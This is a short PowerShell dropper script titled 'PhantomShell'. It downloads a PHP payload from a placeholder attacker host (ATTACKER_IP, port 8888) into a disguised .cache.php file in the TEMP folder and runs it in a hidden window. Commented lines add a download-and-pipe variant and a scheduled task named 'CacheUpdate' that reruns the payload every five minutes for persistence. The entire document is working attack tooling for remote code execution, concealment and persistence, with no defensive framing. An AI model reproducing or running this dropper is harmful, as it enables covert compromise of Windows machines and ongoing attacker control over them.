# PhantomShell PowerShell Dropper (for Windows with PHP installed)
# Requires PHP in PATH

$attackerIP = "ATTACKER_IP"
$attackerPort = "8888"
$url = "http://${attackerIP}:${attackerPort}/phantom.php"
$output = "$env:TEMP\.cache.php"

# Download
Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

# Execute
Start-Process -FilePath "php" -ArgumentList $output -WindowStyle Hidden

# Alternative: Download and pipe
# (Invoke-WebRequest -Uri $url -UseBasicParsing).Content | php

# Scheduled task persistence
# schtasks /create /tn "CacheUpdate" /tr "php $output" /sc minute /mo 5 /f
